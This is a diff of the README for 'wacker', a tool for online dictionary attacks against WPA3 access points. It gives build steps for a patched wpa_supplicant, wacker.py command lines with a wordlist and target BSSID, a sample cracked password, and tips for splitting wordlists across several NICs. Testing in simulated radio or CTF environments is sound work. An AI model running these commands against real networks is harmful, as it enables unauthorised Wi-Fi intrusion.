@@ -1,11 +1,8 @@
 # Overview
 A set of scripts to help perform an online dictionary attack against a WPA3 access point. Wacker leverages the wpa_supplicant control interface to control the operations of the supplicant daemon and to get status information and event notifications ultimately helping speedup connection attempts during brute force attempts.
 
-# Find a real AP to use
-More to come on this.... wacker is still under development.
-
 # Virtual Wifi Arena
-Setup a local environment using mac80211_hwsim (details below) or use the VMs provided by the RF Hackers Sanctuary (highly recommended). Testing was done almost exculsively using the simulated mac80211 environments and perform very well.
+In lieu of finding a WPA3 AP for testing, consider setting up a local environment using mac80211_hwsim (details below) or by using the VMs provided by the RF Hackers Sanctuary (scoreboard.rfhackers.com).
 
 ## Local Simulated Radios
 To set up your own software simulator of 802.11 radios simply configure and load the correct mac80211_hwsim module.
@@ -75,40 +72,25 @@ If you have intentions of farming out your cracking efforts across a series of n
 
 
 # Building wpa_supplicant
-We're providing our own wpa_supplicant in order to guarantee that certain configurations are set as well as a few mods that need to occur within the source code itself. To build simply do the following. Hopefully in the future this will become a deprecated step.
+We're providing our own wpa_supplicant in order to guarantee that certain configurations are set as well as a few mods that need to occur within the source code itself.
 ```
 # apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev
-# cd wpa_supplicant-2.8/wpa_supplicant/
-# cp defconfig_brute_force .config
+# cp defconfig wpa_supplicant-2.10/wpa_supplicant/.config
+# git apply wpa_supplicant.patch
+# cd wpa_supplicant-2.10/wpa_supplicant
 # make -j4
 # ls -al wpa_supplicant
 -rwxr-xr-x 1 root root 13541416 May 31 16:30 wpa_supplicant
 ```
-Of interest are a few new event messages that were added to the wpa supplicant control interface to help further distinguish outcomes the wacker script hooks.
-```
-/** auth success for our brute force stuff (WPA3) */
-#define WPA_EVENT_BRUTE_SUCCESS "CTRL-EVENT-BRUTE-SUCCESS "
-/** auth failure for our brute force stuff (WPA3) */
-#define WPA_EVENT_BRUTE_FAILURE "CTRL-EVENT-BRUTE-FAILURE " 
-```
-
 
 # Python Requirement
-The wacker.py script makes use of a few f-strings among other python3-isms. In the interest of releasing the code sooner this requirement was kept. Here are some generic install instructions for Python3.7 if needed. I know in the future this will become a deprecated step.
+python3.6+ is required
 
-```
-# apt-get install build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev -y
-# wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz
-# tar xf Python-3.7.0.tar.xz
-# cd Python-3.7.0
-# ./configure
-# make -j4
-# make altinstall
-```
-
+# Finding a target
+Wacker should be seen as a complimentary tool to airodump or kismet where target selection is already performed. Wacker intentionally disables background scanning with wpa_supplicant to help speed up authentication attempts.
 
 # Running wacker
-The wacker.py script is intended to perform all the heavy lifting.
+The wacker.py script is intended to perform all the heavy lifting and requires a few specifics regarding the target.
 ```
 # ./wacker.py --help
 usage: wacker.py [-h] --wordlist WORDLIST --interface INTERFACE --bssid BSSID
@@ -138,7 +120,7 @@ Found the password: 'Aeromechanics'
 Stop time: 21 Aug 2020 07:41:24
 ```
 
-Running multiple instances of wacker is easy if you have the spare nics. Don't forget to parition the wordlist as well.
+Running multiple instances of wacker is easy if you have the spare nics. Don't forget to parition the wordlist.
 ```
 # ./wacker.py --wordlist cyberpunk.words.aaa --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1 --freq 2412
 # ./wacker.py --wordlist cyberpunk.words.aab --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2 --freq 2412
@@ -171,7 +153,3 @@ u631_3: WPA: AP key_mgmt 0x400 network profile key_mgmt 0x400; available key_mgm
 u631_3: WPA: Failed to select authenticated key management type
 u631_3: WPA: Failed to set WPA key management and encryption suites
 ```
-
-
-# TODO
-* Create a wrapper script to launch wacker across multiple nics. This will avoid having to instantiate wacker manually for each nic. Have the wrapper also split the wordlist and consolidate the stats.
